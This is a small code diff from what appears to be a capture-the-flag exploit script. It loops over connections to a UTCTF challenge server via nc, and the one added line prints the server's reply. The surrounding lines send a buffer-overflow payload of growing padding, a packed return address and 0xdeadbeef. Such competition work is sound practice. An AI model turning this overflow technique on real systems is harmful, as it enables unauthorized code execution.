@@ -87,6 +87,7 @@ int main(){
 	for(int i = 1;;i++){
 		runcmd("nc", "binary.utctf.live", "9002");
 		ret = cmdin();
+		cout << ret << endl;
 		cmdout(string(i, 'f') + "\xea\x05\x40" + string(10, '0') + "\xef\xbe\xad\xde");
 		ret = cmdin();
 		killcmd();
